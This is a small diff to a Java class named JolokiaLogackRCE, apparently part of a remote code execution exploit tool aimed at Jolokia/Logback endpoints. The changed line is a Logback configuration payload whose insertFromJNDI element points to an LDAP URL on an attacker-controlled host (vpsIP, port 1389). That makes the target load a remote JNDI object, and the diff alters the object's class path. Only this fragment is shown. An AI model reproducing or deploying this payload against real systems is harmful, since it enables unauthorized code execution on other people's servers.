@@ -21,7 +21,7 @@ public class JolokiaLogackRCE {
     private String vpsIP;
     private String vpsPort;
     public String jndipayload = "<configuration>\n" +
-            "    <insertFromJNDI env-entry-name=\"ldap://%s:1389/JNDIObject\" as=\"appName\" />\n" +
+            "    <insertFromJNDI env-entry-name=\"ldap://%s:1389/src.main.template.JNDIObject.JNDIObject\" as=\"appName\" />\n" +
             "</configuration>";
     public JolokiaLogackRCE(String address,String vpsIP,String vpsPort){
         this.address = address;
